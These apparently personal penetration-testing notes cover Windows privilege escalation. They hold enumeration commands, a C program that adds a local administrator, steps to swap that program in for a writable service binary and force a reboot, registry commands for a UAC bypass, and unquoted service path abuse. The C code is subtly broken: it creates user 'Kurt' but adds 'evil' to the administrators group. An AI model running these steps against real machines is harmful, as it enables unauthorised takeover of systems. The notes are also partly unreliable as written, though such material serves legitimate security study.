# Windows Privilege Escalation Notes  

## net commands  

Pass a username and gather more info.  

`net user someUsername`  

To find other users.  

`net user`  



Check who is in local administrators group.  

`net localgroup Administrators`  

## os

Find the version and arch of the os.  

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`  


Find user privileges.  

`whoami /priv`

Find running processes.  

`tasklist`  

Find running processes with powershell.  

`Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`  

## Services  

Are services running program files binaries? These are user installed and the structure and permissions are set by the user or developer.  

Permissions of a service.  

`icacls "C:\Program Files\someDirectory\bin\someBinary.exe"`  

Most relevant permissions.  

```
Mask | Permissions
------------------
F    | Full access 
M    | Modify access
RX   | Read and Execute access
R    | Read-only access
W    | Write-only access
```  

If we find a service with a binary that has full read/write permissions, it can be replaced with something of my choosing.  

The following C code creates a user 'Kurt' and adds him to the local administrator group.  

```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user Kurt password123 /add");
  i = system ("net localgroup administrators evil /add");
  
  return 0;
}
```  

This can be compiled on a kali machine.  

`i686-w64-mingw32-gcc adduser.c -o adduser.exe`  

Move the service binary to keep the original intact.  

`move "C:\Program Files\someDirectoy\bin\someBinary.exe" "C:\Program Files\someDirectory\bin\someBinary_original.exe"`  

Move the malicious binary to the binary the service runs.  

`move adduser.exe "C:\Program Files\someDirectory\bin\someBinary.exe"`  

If we do not have permission to restart this service, we can check if it starts in auto.  

`wmic service where caption="SomeService" get name, caption, state, startmode`  

If the user has reboot permission, a reboot can restart the service automatically and run the malicous binary.  

`shutdown /r /t 0`  


## Integrity levels  

Find group information and integrity level.  

`whoami /groups`  

Change admin password.  

`net user admin newpassw0rd!`  

To change to high integrity level while admin.  

`powershell.exe Start-Process cmd.exe -Verb runAs`  

## Application manifest  

The application manifest is an xml file that informs the os how to handle the program when it is started.  

Using SysinternalsSuite.  

`sigcheck.exe -a -m C:\Windows\System32\aBinary.exe`  

## Processes  

From SysinternalsSuite, use this binary to find out information about a running process.  

`procmon.exe`  

## Reg Keys  

Find attempts to interact with registry keys that give the error.  

`NAME NOT FOUND`  

To tamper with registry keys, we can find our hive with read/write access, this is current user HKEY_CURRENT_USER.  

`HKCU`  

To add a registry key.  

`REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command`  

To add a registry key with v for value name and t for the type.  

`REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ`  

To add a value to a registry key, d is the value and f to add silently.  

`REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f`  

## Unquoted service paths  

This attack is possible when a service directory and sub-directory has write access but the files within cannot be replaced.  

Windows will attempt to execute this unquoted path.  

`C:\Program Files\My Program\My Service\service.exe`  

In the following way.  

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```  

In the above, a executable  

`My.exe`  

Could be placed in.  

`C:\Program Files\My Program`  

If write permissions are misconfigured.  

## Third-party driver attacks  

Enum drivers.  

`driverquery /v`  

Running gcc on windows, run the bat file first to set up PATH env variable.  

```
mingw-w64.bat
gcc --help
```  

